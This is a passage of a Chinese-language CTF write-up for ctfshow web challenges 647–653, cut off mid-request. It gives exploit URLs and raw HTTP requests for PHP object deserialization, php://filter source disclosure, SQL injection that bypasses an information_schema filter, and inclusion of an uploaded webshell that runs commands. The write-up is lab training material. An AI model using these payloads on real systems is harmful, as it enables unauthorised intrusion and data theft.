<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<p>说实话这里不懂这个m是怎么回事，但是结果就是可以覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilClass&amp;m=getenv&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web649"><a href="#web649" class="headerlink" title="web649"></a>web649</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilNumber</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$number</span> = <span class="title function_ invoke__">getArray</span>(<span class="number">1000</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">999</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$m</span>]==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;number is right?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$total</span>, <span class="variable">$times</span>, <span class="variable">$min</span>, <span class="variable">$max</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$min</span> * <span class="variable">$times</span> &gt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$max</span> * <span class="variable">$times</span> &lt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$times</span> &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$times</span>--;</span><br><span class="line">            <span class="variable">$kmix</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$min</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$max</span>);</span><br><span class="line">            <span class="variable">$kmax</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$max</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$min</span>);</span><br><span class="line">            <span class="variable">$kAvg</span> = <span class="variable">$total</span> / (<span class="variable">$times</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$kDis</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$kAvg</span> - <span class="variable">$kmix</span>, <span class="variable">$kmax</span> - <span class="variable">$kAvg</span>);</span><br><span class="line">            <span class="variable">$r</span> = ((<span class="keyword">float</span>)(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) / <span class="number">10000</span>) - <span class="number">0.5</span>) * <span class="variable">$kDis</span> * <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$k</span> = <span class="title function_ invoke__">round</span>(<span class="variable">$kAvg</span> + <span class="variable">$r</span>);</span><br><span class="line">            <span class="variable">$total</span> -= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="variable">$k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>说实话没看懂这啥玩意，不管他直接爆破或者不传值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web650"><a href="#web650" class="headerlink" title="web650"></a>web650</h1><p>这里的话一个效果就是很简单，直接就搞就完事了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilFunction</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;ffffffff&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;you are not ffffffff?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web651"><a href="#web651" class="headerlink" title="web651"></a>web651</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilArray</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$arrays</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$arrays</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$arrays</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;ctfshow&#x27;</span>, <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$arrays</span>)) &amp;&amp;  <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;array?&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>username</code>为属性名<code>ctfshow</code>为属性值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;ctfshow&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilArray&amp;m=O%3A1%3A%22A%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22ctfshow%22%3B%7D&amp;key=flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<p>然后这里面就看不到了去读取其他文件</p>
<h1 id="web652"><a href="#web652" class="headerlink" title="web652"></a>web652</h1><p>但是不知道文件名只能重新回去看抓包了</p>
<p>查看之前的<code>page.php</code>(因为现在的页面已经没有flag获取方式了)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d../page.php HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">__DIR__</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;system36d/util/dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] : <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义 &#x27; &quot; \ 来实现防止注入</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = db::<span class="title function_ invoke__">get_username</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这不一看就注入吗，继续读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php://filter/convert.base64-encode/resource=./util/dbutil.php HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接括号闭合就行了，但是注入的时候发现貌似是过滤了<code>information</code>,那就换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=222)+union+select+group_concat(table_name)+from+mysql.innodb_table_stats+where+database_name=database()%23</span><br><span class="line"></span><br><span class="line">/page.php?id=222)+union+select+*+from+ctfshow_secret%23</span><br></pre></td></tr></table></figure>

<h1 id="web653"><a href="#web653" class="headerlink" title="web653"></a>web653</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=remoteUpdate&amp;auth=ctfshow%7B28b00f799c2e059bafaa1d6bda138d89%7D&amp;update_address=php://filter/convert.base64-encode/resource=./util/common.php HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=ffdq8kb1u3hodm7v9tp9jb0ma6</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/main.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]!==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;651flag未拿到&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(db::<span class="title function_ invoke__">get_key</span>()==<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">__DIR__</span>.DIRECTORY_SEPARATOR.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先去拿一下<code>key</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=222)+union+select+*+from+ctfshow_keys%23</span><br><span class="line"></span><br><span class="line">key_is_here_you_know</span><br></pre></td></tr></table></figure>

<p>重新进后台包含木马(因为我直接进<code>common</code>没成功)</p>
<p>在数据还原这里，但是直接上传不行后面想想我们之前貌似是拿到了<code>backup.dat</code></p>
<p>但是路径又找不到，回去找到在<code>init.php</code>里面</p>
<p>这里终于是成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&amp;a=ls HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038</span><br><span class="line">Content-Length: 81</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Origin: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 